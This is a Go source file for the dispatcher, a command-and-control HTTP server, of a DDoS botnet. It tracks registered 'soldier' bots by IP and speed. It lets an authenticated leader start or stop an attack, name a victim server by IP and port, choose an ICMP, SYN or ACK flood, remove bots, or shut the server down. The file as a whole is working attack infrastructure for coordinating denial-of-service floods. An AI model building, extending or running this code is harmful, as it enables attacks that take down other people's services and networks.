package dispatcher

import (
	"encoding/json"
	"github.com/fatih/color"
	"net"
	"net/http"
	"os"
	"strconv"
	"time"
)

func HandlePing(writer http.ResponseWriter, request *http.Request) {
	if request.Method == "GET" {
		_, _ = writer.Write([]byte("pong"))
	}
}

func HandleCamp(writer http.ResponseWriter, request *http.Request, d *Dispatcher) {
	if request.Method == "GET" {
		c := &d.Cmp
		c.UpdateTotalSpeed()
		err := json.NewEncoder(writer).Encode(d.Cmp)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
		//update soldier last request
		ip, _, err := net.SplitHostPort(request.RemoteAddr)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
		name := request.URL.Query().Get("name")

		soldier := d.Cmp.GetSoldierByIpAndName(name, ip)
		speed := request.URL.Query().Get("speed")

		if soldier == nil {
			//maybe its leader
			return
		}
		if soldier.Name != "" {
			soldier.LastRequest = time.Now()
		}
		if speed != "" {
			soldier.Speed, err = strconv.Atoi(speed)
			if err != nil {
				http.Error(writer, "error getting speed", http.StatusBadRequest)
				return
			}
		}
	}
	if request.Method == "POST" {
		//add soldier to camp
		var soldier Soldier

		err := json.NewDecoder(request.Body).Decode(&soldier)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}

		if d.Cmp.SoldierExists(soldier.Name) {
			http.Error(writer, "Soldier already exists", http.StatusBadRequest)
			return
		}

		if request.RemoteAddr == "" {
			request.RemoteAddr = "127.0.0.1:8081"
		}

		//set soldier ip
		ip, _, err := net.SplitHostPort(request.RemoteAddr)

		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
		soldier.Ip = ip
		d.Cmp.AddSoldier(soldier)
		writer.WriteHeader(http.StatusOK)
	}
	if request.Method == "DELETE" {
		auth := request.Header.Get("Authorization")

		if isAuthorized(auth, d.Cmp.Leader.AuthenticationHash) {
			//remove soldier from camp
			var soldier Soldier
			err := json.NewDecoder(request.Body).Decode(&soldier)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}

			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}

			if !d.Cmp.SoldierExists(soldier.Name) {
				http.Error(writer, "Soldier does not exist", http.StatusNotFound)
				return
			}

			d.Cmp.RemoveSoldier(soldier.Name)
			writer.WriteHeader(http.StatusOK)

		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// update camp status
	if request.Method == "PUT" {
		if isAuthorized(request.Header.Get("Authorization"), d.Cmp.Leader.AuthenticationHash) {
			var cp CampSettings
			err := json.NewDecoder(request.Body).Decode(&cp)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}
			if cp.Status != StatusAttacking && cp.Status != StatusStopped && cp.Status != "" {
				http.Error(writer, "Invalid status", http.StatusBadRequest)
				return
			}
			if cp.DDOSType != DDOSTypeICMP && cp.DDOSType != DDOSTypeSYN && cp.DDOSType != DDOSTypeACK && cp.DDOSType != "" {
				http.Error(writer, "Invalid ddos type", http.StatusBadRequest)
				return
			}
			if cp.VictimServer != "" {
				ip, port, err := net.SplitHostPort(cp.VictimServer)
				if err != nil || port == "" || net.ParseIP(ip) == nil {
					http.Error(writer, "Invalid victim server", http.StatusBadRequest)
					return
				}
			}
			d.Cmp.UpdateSettings(cp.Status, cp.VictimServer, cp.DDOSType)
			writer.WriteHeader(http.StatusOK)

		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}
}

func HandleSystem(writer http.ResponseWriter, request *http.Request, d *Dispatcher) {
	//SHUTDOWN SERVER
	if request.Method == "DELETE" {
		auth := request.Header.Get("Authorization")
		if isAuthorized(auth, d.Cmp.Leader.AuthenticationHash) {
			writer.WriteHeader(http.StatusOK)
			os.Exit(0)
		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
		}
	}
}

func isAuthorized(auth string, hash string) bool {
	if HashOf(auth) == hash {
		return true
	}
	return false
}

func Start(d *Dispatcher) {
	go d.Checker()

	http.HandleFunc("/camp", func(writer http.ResponseWriter, request *http.Request) {
		HandleCamp(writer, request, d)
	})
	http.HandleFunc("/system", func(writer http.ResponseWriter, request *http.Request) {
		HandleSystem(writer, request, d)
	})
	http.HandleFunc("/ping", func(writer http.ResponseWriter, request *http.Request) {
		HandlePing(writer, request)
	})
	color.Green("Starting dispatcher server on %s:%s", d.ListeningAddress, d.ListeningPort)
	err := http.ListenAndServe(d.ListeningAddress+":"+d.ListeningPort, nil)
	if err != nil {
		color.Red("Error starting dispatcher server: %s", err.Error())
	}
}
